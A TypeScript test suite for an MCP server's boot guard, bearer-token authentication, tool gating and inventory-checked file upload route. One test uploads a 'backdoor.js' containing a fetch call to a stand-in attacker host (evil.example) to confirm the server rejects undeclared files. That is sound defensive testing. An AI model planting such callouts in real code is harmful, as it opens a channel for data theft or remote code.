/**
 * The service over a real socket, driven by a real MCP client.
 *
 * These are HTTP and protocol properties, and a handler called directly cannot
 * be wrong about any of them: whether an anonymous caller can complete
 * `initialize`, whether a tool list leaks before authentication, what the
 * `WWW-Authenticate` challenge says, and whether the upload route enforces the
 * inventory when the bytes arrive over a wire rather than through a function
 * call. Same reasoning as `apps/api/src/identityRoutes.test.ts`.
 */

import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js'
import { SDK_DOCS } from '@townsquare/sdk'

import { McpBootError, assertBootable, startMcpServer, type StartedMcp } from './server.js'
import { mintToken } from './tokens.js'
import { sha256Hex } from './drafts.js'
import { runTool } from './tools.js'
import { makeFixture, makeResident, helloBundle, type Fixture } from './fixtures.js'

const enc = new TextEncoder()

describe('the boot guard', () => {
  it('passes against the artifact as generated', () => {
    expect(() => assertBootable()).not.toThrow()
  })

  it('refuses to boot on a hand-edited docs artifact', () => {
    const tampered = {
      ...SDK_DOCS,
      sections: { ...SDK_DOCS.sections, overview: 'you can call anything you like' },
    }
    expect(() => assertBootable(tampered)).toThrow(McpBootError)
    expect(() => assertBootable(tampered)).toThrow(/edited by hand/)
  })

  it('refuses to boot when the docs describe an SDK this build does not have', () => {
    expect(() => assertBootable(SDK_DOCS, [{ method: 'records.delete' }])).toThrow(
      /does not match the installed SDK/,
    )
  })
})

describe('over HTTP', () => {
  let fixture: Fixture
  let started: StartedMcp
  let url: string

  beforeEach(async () => {
    fixture = makeFixture()
    started = await startMcpServer({ ctx: fixture.ctx, port: 0, handleSignals: false })
    url = `http://127.0.0.1:${started.port}${started.path}`
  })

  afterEach(async () => {
    await started.shutdown()
  })

  async function tokenFor(handle: string, verified = false): Promise<string> {
    const principal = await makeResident(fixture, handle, { verified })
    const minted = await mintToken(
      fixture.tokens,
      { userId: principal.userId, label: 'test' },
      fixture.clock.now,
    )
    return minted.token
  }

  async function connect(token: string): Promise<Client> {
    const client = new Client({ name: 'test', version: '1.0.0' })
    await client.connect(
      new StreamableHTTPClientTransport(new URL(url), {
        requestInit: { headers: { Authorization: `Bearer ${token}` } },
      }),
    )
    return client
  }

  it('answers /health without a credential', async () => {
    const res = await fetch(`http://127.0.0.1:${started.port}/health`)
    expect(res.status).toBe(200)
    expect(await res.json()).toMatchObject({ status: 'ok', service: 'townsquare' })
  })

  it('refuses an anonymous caller before any tool exists', async () => {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} }),
    })
    expect(res.status).toBe(401)
    expect(res.headers.get('www-authenticate')).toContain('Bearer realm="townsquare"')
    // Not one tool name reaches an unauthenticated caller.
    const body = await res.text()
    expect(body).not.toContain('begin_upload')
    expect(body).not.toContain('whoami')
  })

  it('refuses a revoked token and says so', async () => {
    const token = await tokenFor('builder')
    const [record] = await fixture.tokens.tokensForUser(
      (await fixture.identity.userByHandle('builder'))!.id,
    )
    await fixture.tokens.revokeToken(record!.id, fixture.clock.now)

    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        accept: 'application/json, text/event-stream',
        authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} }),
    })
    expect(res.status).toBe(401)
    expect(JSON.stringify(await res.json())).toContain('revoked')
  })

  it('lists every tool to an authenticated resident', async () => {
    const client = await connect(await tokenFor('builder'))
    const { tools } = await client.listTools()
    expect(tools.map((t) => t.name)).toContain('whoami')
    expect(tools).toHaveLength(17)
    await client.close()
  })

  it('runs a tool and returns its result', async () => {
    const client = await connect(await tokenFor('builder'))
    const result = await client.callTool({ name: 'whoami', arguments: {} })
    const text = (result.content as Array<{ text: string }>)[0]!.text
    expect(JSON.parse(text)).toMatchObject({ handle: 'builder', verified: false, can_submit: false })
    await client.close()
  })

  it('reports a gated tool as a tool error rather than a transport failure', async () => {
    const client = await connect(await tokenFor('newcomer'))
    const result = await client.callTool({ name: 'submit', arguments: { draft_id: 'whatever' } })
    expect(result.isError).toBe(true)
    expect((result.content as Array<{ text: string }>)[0]!.text).toContain('verified residents')
    await client.close()
  })

  it('reflects verification granted after the token was minted', async () => {
    const token = await tokenFor('newcomer')
    const client = await connect(token)

    const before = await client.callTool({ name: 'whoami', arguments: {} })
    expect(JSON.parse((before.content as Array<{ text: string }>)[0]!.text).verified).toBe(false)
    await client.close()

    const user = (await fixture.identity.userByHandle('newcomer'))!
    await fixture.identity.updateUser(
      user.id,
      { verifiedResident: true, verifiedMethod: 'manual', verifiedAt: fixture.clock.now },
      fixture.clock.now,
    )

    const after = await connect(token)
    const result = await after.callTool({ name: 'whoami', arguments: {} })
    expect(JSON.parse((result.content as Array<{ text: string }>)[0]!.text).verified).toBe(true)
    await after.close()
  })
})

describe('the upload route', () => {
  let fixture: Fixture
  let started: StartedMcp
  let base: string

  beforeEach(async () => {
    fixture = makeFixture()
    started = await startMcpServer({ ctx: fixture.ctx, port: 0, handleSignals: false })
    base = `http://127.0.0.1:${started.port}`
  })

  afterEach(async () => {
    await started.shutdown()
  })

  async function begin() {
    const me = await makeResident(fixture, 'builder', { verified: true })
    const files = helloBundle()
    const inventory = files.map((f) => {
      const bytes = enc.encode(f.text)
      return { path: f.path, sha256: sha256Hex(bytes), bytes: bytes.byteLength }
    })
    const begun = (await runTool(fixture.ctx, me, 'begin_upload', {
      slug: 'hello',
      inventory,
    })) as { draft_id: string; upload_token: string }
    return { me, files, begun }
  }

  function post(draftId: string, path: string, body: string, token: string | null) {
    return fetch(`${base}/upload/${draftId}?path=${encodeURIComponent(path)}`, {
      method: 'POST',
      headers: token ? { authorization: `Bearer ${token}` } : {},
      body,
    })
  }

  it('stores a declared file whose bytes match', async () => {
    const { files, begun } = await begin()
    const file = files[1]!
    const res = await post(begun.draft_id, file.path, file.text, begun.upload_token)
    expect(res.status).toBe(200)
    expect(await res.json()).toMatchObject({ stored: file.path, remaining: 2 })
  })

  it('refuses bytes that do not match the declaration', async () => {
    const { files, begun } = await begin()
    const res = await post(begun.draft_id, files[1]!.path, 'something else entirely', begun.upload_token)
    expect(res.status).toBe(409)
    expect(JSON.stringify(await res.json())).toMatch(/bytes|hashes/)
  })

  it('refuses a path that was never declared', async () => {
    const { begun } = await begin()
    const res = await post(begun.draft_id, 'backdoor.js', 'fetch("https://evil.example")', begun.upload_token)
    expect(res.status).toBe(409)
    expect(JSON.stringify(await res.json())).toContain('not in the inventory')
  })

  it('refuses without the ticket', async () => {
    const { files, begun } = await begin()
    expect((await post(begun.draft_id, files[1]!.path, files[1]!.text, null)).status).toBe(401)
    expect((await post(begun.draft_id, files[1]!.path, files[1]!.text, 'wrong')).status).toBe(401)
  })

  it('answers an unknown draft exactly like a wrong ticket', async () => {
    const { files, begun } = await begin()
    const unknown = await post('doesnotexist', files[1]!.path, files[1]!.text, begun.upload_token)
    const wrongTicket = await post(begun.draft_id, files[1]!.path, files[1]!.text, 'wrong')
    expect(unknown.status).toBe(401)
    expect(await unknown.json()).toEqual(await wrongTicket.json())
  })

  it('marks the draft complete once the last declared file lands', async () => {
    const { files, begun } = await begin()
    for (const file of files) {
      const res = await post(begun.draft_id, file.path, file.text, begun.upload_token)
      expect(res.status, file.path).toBe(200)
    }
    expect((await fixture.drafts.draftById(begun.draft_id))!.status).toBe('complete')
  })

  it('is POST only', async () => {
    const { begun } = await begin()
    const res = await fetch(`${base}/upload/${begun.draft_id}?path=index.html`)
    expect(res.status).toBe(405)
  })
})
